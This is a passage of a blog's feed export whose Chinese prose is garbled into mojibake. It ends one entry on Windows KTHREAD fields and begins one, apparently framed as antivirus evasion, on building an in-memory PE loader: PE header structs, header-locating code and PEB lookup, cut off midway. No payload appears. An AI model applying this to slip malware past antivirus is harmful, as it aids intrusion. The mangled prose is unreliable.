SListFaultAddress;</span><br><span class="line">     PVOID MdlForLockedTeb;</span><br><span class="line">&#125; KTHREAD, *PKTHREAD;</span><br></pre></td></tr></table></figure><p>Headerï¼šè¯´æ˜è¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªåˆ†å‘å™¨å¯¹è±¡ï¼Œå¯ä»¥è¢«ç­‰å¾…ã€‚çº¿ç¨‹ç»“æŸæ—¶ï¼Œç­‰å¾…è¢«æ»¡è¶³ã€‚</p><p>MutantListHeadï¼šæŒ‡å‘ä¸€ä¸ªé“¾è¡¨å¤´ã€‚é“¾è¡¨ä¸­åŒ…å«æ‰€æœ‰å±äºè¯¥çº¿ç¨‹çš„çªå˜ä½“å¯¹è±¡ï¼ˆmutantï¼Œå¯¹åº”äº’æ–¥ä½“å¯¹è±¡ï¼‰ã€‚</p><p>InitialStackï¼šåŸå§‹æ ˆä½ç½®ï¼ˆé«˜åœ°å€ï¼‰</p><p>StackLimitï¼šæ ˆä½åœ°å€</p><p>KernelStackï¼šå†…æ ¸è°ƒç”¨æ ˆå¼€å§‹ä½ç½®</p><p>StackBaseï¼šå½“å‰æ ˆçš„åŸºåœ°å€ã€‚</p><p>ThreadLockï¼šè‡ªæ—‹é”ï¼Œç”¨äºä¿æŠ¤çº¿ç¨‹æ•°æ®æˆå‘˜ã€‚</p><p>ApcStateï¼šKAPC_STATEç»“æ„ï¼ŒæŒ‡å®šçº¿ç¨‹çš„APCä¿¡æ¯ï¼ŒåŒ…æ‹¬APCé“¾è¡¨ï¼Œæ˜¯å¦æœ‰APCæ­£åœ¨ç­‰å¾…ï¼Œæ˜¯å¦æ­£åœ¨å¤„ç†APCã€‚</p><p>ApcQueueableï¼šæ˜¯å¦å¯æ’å…¥APC</p><p>NextProcessorï¼šå…³äºå¤„ç†å™¨è°ƒåº¦çš„é€‰æ‹©ã€‚</p><p>DeferredProcessorï¼šå…³äºå¤„ç†å™¨è°ƒåº¦çš„é€‰æ‹©ã€‚</p><p>AdjustReasonï¼šä¼˜å…ˆçº§è°ƒæ•´åŸå› </p><p>AdjustIncrementï¼šä¼˜å…ˆçº§è°ƒæ•´è°ƒæ•´é‡</p><p>ApcQueueLockï¼šä¿æŠ¤APCé˜Ÿåˆ—çš„è‡ªæ—‹é”ã€‚</p><p>ContextSwitchesï¼šè®°å½•çº¿ç¨‹è¿›è¡Œäº†å¤šå°‘æ¬¡åˆ‡æ¢ã€‚</p><p>Stateï¼šçº¿ç¨‹å½“å‰çŠ¶æ€ã€‚</p><p>NpxStateï¼šæµ®ç‚¹å¤„ç†å™¨çŠ¶æ€ã€‚</p><p>Alertableï¼šçº¿ç¨‹æ˜¯å¦å¯ä»¥è¢«å”¤é†’ã€‚</p><p>WaitNextï¼š</p><p>WaitIrqlï¼šåŸå…ˆçš„IRQLã€‚</p><p>WaitReasonï¼šç­‰å¾…åŸå› </p><p>WaitModeï¼šçº¿ç¨‹ç­‰å¾…æ—¶çš„å¤„ç†å™¨æ¨¡å¼ï¼Œå†…æ ¸orç”¨æˆ·</p><p>WaitStatusï¼šç­‰å¾…çš„ç»“æœçŠ¶æ€ã€‚</p><p>WaitBlockListï¼šKWAIT_BLOCKä¸ºå…ƒç´ çš„é“¾è¡¨ï¼Œè®°å½•çº¿ç¨‹æ‰€æœ‰ç­‰å¾…çš„åˆ†å‘å™¨å¯¹è±¡ã€‚æ¯ä¸ªåˆ†å‘å™¨å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªKWAIT_BLOCKç»„æˆçš„é“¾è¡¨ï¼Œè®°å½•æ‰€æœ‰ç­‰å¾…åœ¨è¯¥å¯¹è±¡çš„çº¿ç¨‹ã€‚</p><p>GateObjectï¼šç­‰å¾…çš„é—¨å¯¹è±¡ï¼Œç­‰å¾…é—¨å¯¹è±¡å’Œç­‰å¾…åˆ†å‘å™¨å¯¹è±¡ä¸ä¼šåŒæ—¶å‘ç”Ÿã€‚</p><p>Priorityï¼šåŠ¨æ€ä¼˜å…ˆçº§ã€‚</p><p>BasePriorityï¼šåŸºæœ¬ä¼˜å…ˆçº§ã€‚</p><p>PriorityDecrementï¼šä¼˜å…ˆçº§åŠ¨æ€è°ƒæ•´è¿‡ç¨‹ä¸­çš„é€’å‡å€¼ã€‚</p><p>Saturationï¼šçº¿ç¨‹åŸºæœ¬ä¼˜å…ˆçº§è°ƒæ•´ç›¸å¯¹äºè¿›ç¨‹åŸºæœ¬ä¼˜å…ˆçº§æ˜¯å¦è¶…è¿‡äº†åŒºé—´çš„ä¸€åŠã€‚</p><p>EnableStackSwapï¼šå†…æ ¸æ ˆæ˜¯å¦å‡†è®¸è¢«æ¢å‡ºã€‚</p><p>SwapBusyï¼šå½“å‰æ˜¯å¦æ­£åœ¨è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚</p><p>Alertedï¼šçº¿ç¨‹åœ¨è­¦å‘Šæ¨¡å¼ä¸‹æ˜¯å¦å¯ä»¥è¢«å”¤é†’ã€‚</p><p>WaitListEntryï¼šåŒå‘é“¾è¡¨èŠ‚ç‚¹ï¼Œç­‰å¾…è¢«æ‰§è¡Œæ—¶ï¼Œä½œä¸ºèŠ‚ç‚¹åŠ å…¥æŸé“¾è¡¨</p><p>SwapListEntryï¼šå•é“¾è¡¨èŠ‚ç‚¹ï¼Œå†…æ ¸æ ˆéœ€è¦è¢«æ¢å‡ºæ—¶ï¼ŒåŠ å…¥KiStackInSwapListHeadä¸ºå¤´çš„é“¾è¡¨ã€‚å¦å¤–ï¼Œçº¿ç¨‹å¤„äºDeferredReadyçŠ¶æ€æ—¶åŠ å…¥DeferredReadyListHeadä¸ºå¤´çš„é“¾è¡¨ã€‚</p><p>Queueï¼šé˜Ÿåˆ—åˆ†å‘å™¨å¯¹è±¡ï¼Œçº¿ç¨‹æ­£åœ¨å¤„ç†æ­¤é˜Ÿåˆ—ä¸­çš„é¡¹ã€‚</p><p>WaitTimeï¼šçº¿ç¨‹è¿›å…¥ç­‰å¾…æ—¶åˆ»çš„æ—¶é—´ç‚¹ã€‚</p><p>KernelApcDisable/SpecialApcDisableï¼šå†…æ ¸APCå’Œç‰¹æ®Šå†…æ ¸APCæ˜¯å¦è¢«ç¦æ­¢ã€‚</p><p>TEBï¼šè¿›ç¨‹åœ°å€ç©ºé—´çš„ä¸€ä¸ªTEBåŸŸ</p><p>Timerï¼šå®šæ—¶å™¨ã€‚</p><p>AutoAlignmentï¼šä¸KPROCESSç›¸åŒ</p><p>DisableBoostï¼šä¸KPROCESSç›¸åŒ</p><p>WaitBlockï¼š4ä¸ªKWAIT_BLOCKæˆå‘˜çš„æ•°ç»„ï¼Œçº¿ç¨‹ç­‰å¾…çš„åˆ†å‘å™¨å°‘äº4ä¸ªæ—¶ï¼Œä½¿ç”¨è¿™é‡Œçš„ç©ºé—´ï¼Œä¸åˆ†é…æ–°ç©ºé—´ã€‚</p><p>QueueListEntryï¼šçº¿ç¨‹å¤„ç†ä¸€ä¸ªé˜Ÿåˆ—é¡¹æ—¶ï¼ŒåŠ å…¥åˆ°é˜Ÿåˆ—å¯¹è±¡çš„çº¿ç¨‹é“¾è¡¨ä¸­çš„åœ°å€ã€‚</p><p>TrapFrameï¼šæŒ‡å‘KTRAP_FRAMEç±»å‹çš„æŒ‡é’ˆã€‚ç”¨æˆ·ä¿å­˜æ‰§è¡Œç°åœºã€‚</p><p>CallbackStackï¼šçº¿ç¨‹çš„å›è°ƒæ ˆåœ°å€ï¼Œåœ¨ä»å†…æ ¸æ¨¡å¼è¿”å›ç”¨æˆ·æ¨¡å¼æ—¶ç”¨ã€‚</p><p>ServiceTableï¼š æŒ‡å‘ç³»ç»Ÿä½¿ç”¨çš„ç³»ç»ŸæœåŠ¡è¡¨ï¼ŒéGUIçº¿ç¨‹ä¸ºKeServiceDescriptorTableï¼ŒGUIçº¿ç¨‹ä¸ºKeServiceDescriptorTableShadowã€‚</p><p>IdealProcessï¼šç†æƒ³å¤„ç†å™¨</p><p>Preemptedï¼šæ˜¯å¦è¢«é«˜ä¼˜å…ˆçº§çº¿ç¨‹æŠ¢å äº†ã€‚</p><p>ProcessReadyQueueï¼šæ˜¯å¦åœ¨è¿›ç¨‹å¯¹è±¡çš„ReadyListHeadåˆ—è¡¨ä¸­ã€‚</p><p>KernelStackResidentï¼šçº¿ç¨‹çš„å†…æ ¸æ ˆæ˜¯å¦é©»ç•™åœ¨çº¿ç¨‹ä¸­ã€‚</p><p>Affinityï¼šå¤„ç†å™¨äº²å’Œæ€§ï¼Œä¸ºçº¿ç¨‹æŒ‡å®šçš„å¤„ç†å™¨é›†åˆå¿…é¡»æ˜¯è¯¥é›†åˆçš„å­é›†ã€‚</p><p>UserAffinityï¼šçº¿ç¨‹çš„ç”¨æˆ·äº²å’Œæ€§ã€‚</p><p>Processï¼šæ‰§è¡Œçº¿ç¨‹çš„è¿›ç¨‹å¯¹è±¡ã€‚</p><p>ApcStateIndexï¼šæŒ‡æ˜å½“å‰APCçŠ¶æ€åœ¨ApcStatePointeråŸŸä¸­çš„ç´¢å¼•ã€‚</p><p>Win32Threadï¼šæŒ‡å‘Windowså­ç³»ç»Ÿç®¡ç†çš„åŒºåŸŸçš„æŒ‡é’ˆã€‚</p><p>SuspendApc/SuspendSemaphoreï¼šç”¨äºæ”¯æŒçº¿ç¨‹æŒ‚èµ·çš„åŸŸã€‚</p><p>ThreadListEntryï¼šåŒé“¾è¡¨çš„èŠ‚ç‚¹ï¼Œçº¿ç¨‹è¢«åˆ›å»ºæ—¶ï¼ŒåŠ å…¥åˆ°è¿›ç¨‹çš„ThreadListHeadé“¾è¡¨ä¸­ã€‚</p><p>SListFaultAddressï¼šä¸Šä¸€æ¬¡ç”¨æˆ·æ¨¡å¼äº’é”å•é“¾è¡¨POPæ“ä½œå‘ç”Ÿé¡µé¢é”™è¯¯çš„åœ°å€ã€‚</p><p>SuspendSemaphoreï¼šä¸ä¸Šé¢æœ‰å…³ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windowsä¸­è¿›ç¨‹ä¸çº¿ç¨‹çš„è®¾ç½®&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>ã€å…æ€ã€‘å†…å­˜åŠ è½½PEæ–‡ä»¶</title>
    <link href="https://joe1sn.eu.org/2023/06/13/pe-loader/"/>
    <id>https://joe1sn.eu.org/2023/06/13/pe-loader/</id>
    <published>2023-06-13T00:46:20.000Z</published>
    <updated>2023-06-13T05:14:54.198Z</updated>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨windows APIç¼–å†™PEæ–‡ä»¶åŠ è½½å™¨ï¼ˆLoaderï¼‰<br />ç›®å‰æ”¯æ”¯æŒ32ä½</p><span id="more"></span><h1 id="peæ–‡ä»¶ç»“æ„"><a class="markdownIt-Anchor" href="#peæ–‡ä»¶ç»“æ„"></a> PEæ–‡ä»¶ç»“æ„</h1><p>åœ¨ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹ä¸­è®²çš„å·²ç»å¾ˆè¯¦ç»†äº†ï¼Œè¿™é‡Œä¸»è¦é¢å‘32ä½çš„å¯æ‰§è¡Œç¨‹åºæ¥è®²è§£ã€‚</p><p><img src="https://img.joe1sn.top/uploads/big/0cdf49890a47067a93b43fd16ec19448.png" alt="MZ" /></p><p>DOSå¤´å’ŒPEå¤´ç»Ÿç§°ä¸ºPEå¤´ï¼Œä¸‹é¢çš„éƒ¨åˆ†ç§°ä¹‹ä¸ºPEä½“ã€‚</p><h2 id="doså¤´"><a class="markdownIt-Anchor" href="#doså¤´"></a> DOSå¤´</h2><p>DOSå¤´çš„æ–‡ä»¶ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// æ–‡ä»¶æœ€åä¸€é¡µçš„å­—èŠ‚æ•°</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// æ–‡ä»¶ä¸­çš„é¡µæ•°</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// é‡å®šä½</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// æ®µä¸­å¤´å¤§å°</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// éœ€è¦æœ€å°‘çš„é¢å¤–æ®µè½</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// éœ€è¦æœ€å¤šçš„é¢å¤–æ®µè½</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// åˆå§‹ï¼ˆç›¸å¯¹ï¼‰SS å€¼</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// åˆå§‹SPå€¼</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// åˆå§‹ IP å€¼</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// åˆå§‹ï¼ˆç›¸å¯¹ï¼‰CS å€¼</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// é‡å®šä½è¡¨çš„æ–‡ä»¶åœ°å€</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// å åŠ æ•°</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// ä¿ç•™å­—</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM æ ‡è¯†ç¬¦ï¼ˆç”¨äº e_oeminfoï¼‰</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEMä¿¡æ¯ï¼› e_oemid å…·ä½“</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// ä¿ç•™å­—</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// æ–°exeå¤´æ–‡ä»¶åœ°å€</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­DOSå¤´æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„éƒ¨åˆ†<code>e_lfanew</code>ï¼Œä»–æŒ‡å‘äº†exeçš„æ–‡ä»¶å¤´ï¼Œåœ¨æˆ‘ä»¬ç¼–å†™çš„loaderè·å–å¤´çš„éƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOSHeader = PIMAGE_DOS_HEADER(Image);<span class="comment">//å¾—åˆ°DOSå¤´</span></span><br><span class="line">NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew);<span class="comment">//å¾—åˆ°PEå¤´</span></span><br></pre></td></tr></table></figure><h2 id="ntå¤´"><a class="markdownIt-Anchor" href="#ntå¤´"></a> NTå¤´</h2><p>é‚£ä¹ˆå…³äºNTæ–‡ä»¶å¤´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;<span class="comment">//æ–‡ä»¶ç±»å‹</span></span><br><span class="line">                    <span class="comment">// IMAGE_DOS_SIGNATURE                 0x5A4D      // MZ</span></span><br><span class="line">                    <span class="comment">// IMAGE_OS2_SIGNATURE                 0x454E      // NE</span></span><br><span class="line">                    <span class="comment">// IMAGE_OS2_SIGNATURE_LE              0x454C      // LE</span></span><br><span class="line">                    <span class="comment">// IMAGE_VXD_SIGNATURE                 0x454C      // LE</span></span><br><span class="line">                    <span class="comment">// IMAGE_NT_SIGNATURE                  0x00004550  // PE00</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–‡ä»¶å¤´å¾ˆå…³é”®ï¼ŒSignatureå¯ä»¥åˆ¤æ–­ç±»å‹ï¼ŒFileHeaderå³æ–‡ä»¶å¤´ï¼Œå¯ä»¥ä»<code>NumberOfSections</code>è·å¾—èŠ‚åŒºæ•°ç›®ã€‚</p><p>OPTIONAL_HEADERç»“æ„ä½“å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>OPTIONAL_HEADERä¸­è®°è½½äº†å¾ˆå¤šè¯¦ç»†ä¿¡æ¯ï¼Œå…¶ä¸­æœ‰ç”¨çš„å°±æ˜¯<code>ImageBase</code>ã€<code>SizeOfHeaders</code>å’Œ<code>AddressOfEntryPoint</code></p><ul><li><code>ImageBase</code>ï¼šæå†™åœ¨è™šæ‹Ÿå†…å­˜ä¸­ï¼ˆä¸äº†è§£æ“ä½œç³»ç»Ÿçš„è¯å¯ä»¥ç†è§£ä¸ºç¨‹åºå¯åŠ¨çš„åŸºåœ°å€ï¼‰çš„åœ°å€</li><li><code>SizeOfHeaders</code>ï¼šè®°å½•äº†æ•´ä¸ªPEå¤´çš„å¤§å°ï¼ˆåŒ…å«DOSå¤´ï¼‰ï¼Œæ–¹ä¾¿æ§åˆ¶å†™å…¥ç¨‹åºçš„å¤§å°</li><li><code>AddressOfEntryPoint</code>ï¼š<strong>è®°å½•ç¨‹åºå…¥å£ä»£ç èµ·å§‹åœ°å€</strong>ï¼Œæ¯”å¦‚<code>ImageBase</code>å¯èƒ½ä¸º0x4000ï¼Œ<code>AddressOfEntryPoint</code>å¯èƒ½ä¸º0x4100ã€‚</li></ul><h2 id="iatå¯¼å…¥è¡¨"><a class="markdownIt-Anchor" href="#iatå¯¼å…¥è¡¨"></a> IATå¯¼å…¥è¡¨</h2><p>Windowsä¸ºäº†çŸ¥é“ä½¿ç”¨äº†é‚£äº›å‡½æ•°ï¼Œä¼šå¯¼å…¥è¿™äº›å‡½æ•°çš„è¡¨ï¼Œä»å¯¼å…¥è¡¨åˆ°åŠ¨æ€é“¾æ¥ä¸­æŸ¥æ‰¾å‡½æ•°ã€‚æ¯ä¸€ä¸ªèŠ‚éƒ½ä¼šæœ‰ä¸€ä¸ªå¯¼å…¥è¡¨ï¼Œæ¯ä¸€ä¸ªè¡¨çš„ä¿¡æ¯æœ‰40å­—èŠ‚ï¼Œé‚£ä¹ˆæ‰¾åˆ°è¡¨çš„åœ°å€å°±æ˜¯<code>base + count*40</code>ï¼Œå…¶ä¸­<code>base</code>ä¸º<code>DOSHeader-&gt;e_lfanew+248</code>ï¼Œè¿™é‡Œæ˜¯å¯¼å…¥è¡¨çš„åˆå§‹åœ°å€çš„æŒ‡é’ˆã€‚</p><h1 id="è¿›ç¨‹ç»“æ„"><a class="markdownIt-Anchor" href="#è¿›ç¨‹ç»“æ„"></a> è¿›ç¨‹ç»“æ„</h1><h2 id="pre-peb"><a class="markdownIt-Anchor" href="#pre-peb"></a> Pre- PEB</h2><p>è¿™éƒ¨åˆ†æ˜¯é“ºå«çš„å†…å®¹ï¼Œä¸»è¦æè¿°çš„å°±æ˜¯å‡ ä¸ªåŸºç¡€å¯„å­˜å™¨ã€‚</p><p>è¿™äº›å¯„å­˜å™¨æ˜¯CPUä¸­è®¾è®¡å¥½çš„ï¼Œ</p><ul><li>CS (Code Segment Register)ï¼šä»£ç æ®µçš„æ®µåŸºå€</li><li>DS(Data Segment Register)ï¼šæ•°æ®æ®µçš„æ®µåŸºå€</li><li>ES(Extra Segment Register)ï¼šå…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µåŸºå€¼ï¼Œç§°ä¸ºâ€œé™„åŠ â€æ˜¯å› ä¸ºæ­¤æ®µå¯„å­˜å™¨ç”¨é€”ä¸åƒå…¶ä»– sreg é‚£æ ·å›ºå®šï¼Œå¯ä»¥é¢å¤–åšä»–ç”¨ã€‚</li><li>FS(Extra Segment Register)ï¼šå…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µåŸºå€¼</li><li>GSï¼šåŒä¸Š</li><li>SS(Stack Segment Register)ï¼šå †æ ˆæ®µå¯„å­˜å™¨</li></ul><ol><li>åœ¨å®æ¨¡å¼ä¸­ï¼ŒCSã€DSã€ESã€SSä¸­çš„å€¼æ˜¯ç‰©ç†åœ°å€</li><li>åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œè£…å…¥å¯„å­˜å™¨çš„æ˜¯<strong>æ®µé€‰æ‹©å­FS</strong></li></ol><p>å…¶ä¸­æœ€é‡è¦çš„å°±æ˜¯ <strong>FSå¯„å­˜å™¨</strong>ã€‚åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œx86å¤„ç†å™¨ä½¿ç”¨æ®µæè¿°ç¬¦æ¥ç®¡ç†å†…å­˜ï¼Œå°†å†…å­˜åˆ’åˆ†ä¸ºä¸åŒçš„æ®µï¼Œå¦‚ä»£ç æ®µã€æ•°æ®æ®µã€å †æ ˆæ®µç­‰ã€‚æ®µé€‰æ‹©å­æ˜¯ä¸€ä¸ª16ä½çš„å€¼ï¼Œç”¨äºæ ‡è¯†ç‰¹å®šæ®µçš„èµ·å§‹åœ°å€å’Œè®¿é—®æƒé™ã€‚</p><p>FSå¯„å­˜å™¨ä¸»è¦æœ‰ä¸¤ä¸ªä½œç”¨ï¼š</p><ol><li>å®šä½çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆThread Local Storageï¼ŒTLSï¼‰ï¼š<ul><li>åœ¨å¤šçº¿ç¨‹ç¨‹åºä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹é€šå¸¸éƒ½æœ‰è‡ªå·±çš„TLSï¼Œç”¨äºå­˜å‚¨çº¿ç¨‹æœ¬åœ°çš„æ•°æ®ï¼Œå¦‚çº¿ç¨‹ç‰¹å®šå˜é‡ã€‚</li><li>FSå¯„å­˜å™¨ä¸­å­˜å‚¨äº†ä¸€ä¸ªç‰¹æ®Šçš„æ®µé€‰æ‹©å­ï¼Œç”¨äºå®šä½çº¿ç¨‹çš„TLSã€‚</li><li>çº¿ç¨‹å¯ä»¥é€šè¿‡è®¿é—®FSå¯„å­˜å™¨æ¥è®¿é—®è‡ªå·±çš„TLSã€‚</li></ul></li><li>è®¿é—®æ®µæè¿°ç¬¦è¡¨ï¼ˆGlobal Descriptor Tableï¼ŒGDTï¼‰ï¼š<ul><li>GDTæ˜¯ä¸€ä¸ªè¡¨æ ¼ï¼Œç”¨äºå­˜å‚¨æ®µæè¿°ç¬¦çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ®µçš„èµ·å§‹åœ°å€ã€å¤§å°ã€è®¿é—®æƒé™ç­‰ã€‚</li><li>FSå¯„å­˜å™¨ä¸­å­˜å‚¨äº†GDTä¸­çš„ä¸€ä¸ªæ®µé€‰æ‹©å­ï¼Œè¯¥æ®µé€‰æ‹©å­æŒ‡å‘äº†ä¸€ä¸ªæè¿°çº¿ç¨‹å±€éƒ¨å­˜å‚¨æ®µçš„æ®µæè¿°ç¬¦ã€‚</li><li>å½“çº¿ç¨‹éœ€è¦è®¿é—®TLSæ—¶ï¼Œé€šè¿‡è®¿é—®FSå¯„å­˜å™¨ä¸­çš„æ®µé€‰æ‹©å­ï¼Œå¯ä»¥è·å¾—TLSçš„èµ·å§‹åœ°å€å’Œè®¿é—®æƒé™ã€‚</li></ul></li></ol><h2 id="peb"><a class="markdownIt-Anchor" href="#peb"></a> PEB</h2><p>PEBå…¨ç§°æ˜¯ Process Environment Blockï¼Œè¿›ç¨‹ç¯å¢ƒå—</p><p>ä¸ºäº†è·å–PEBçš„æ¶ˆæ¯å¯ä»¥ç›´æ¥ä»FSæ®µé€‰æ‹©å­æ‰¾åˆ°TEBï¼ˆçº¿ç¨‹ç¯å¢ƒå—ï¼‰ï¼Œå†ä»TEBæ‰¾åˆ°PEBï¼Œè¿™é‡Œå¯ä»¥<code>CTX-&gt;Ebx + 8</code>æ‰¾åˆ°PEB</p><h2 id="ç¼–ç¨‹ç›¸å…³"><a class="markdownIt-Anchor" href="#ç¼–ç¨‹ç›¸å…³"></a> ç¼–ç¨‹ç›¸å…³</h2><p>åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>CreateProcess</code>å‡½æ•°</p><blockquote><p>æ–°è¿›ç¨‹åœ¨è°ƒç”¨è¿›ç¨‹çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œã€‚</p><p>å¦‚æœè°ƒç”¨è¿›ç¨‹æ­£åœ¨æ¨¡æ‹Ÿå…¶ä»–ç”¨æˆ·ï¼Œåˆ™æ–°è¿›ç¨‹å°†ä»¤ç‰Œç”¨äºè°ƒç”¨è¿›ç¨‹ï¼Œè€Œä¸æ˜¯æ¨¡æ‹Ÿä»¤ç‰Œã€‚ è‹¥è¦åœ¨æ¨¡æ‹Ÿä»¤ç‰Œè¡¨ç¤ºçš„ç”¨æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œæ–°è¿›ç¨‹ï¼Œè¯·ä½¿ç”¨ <a 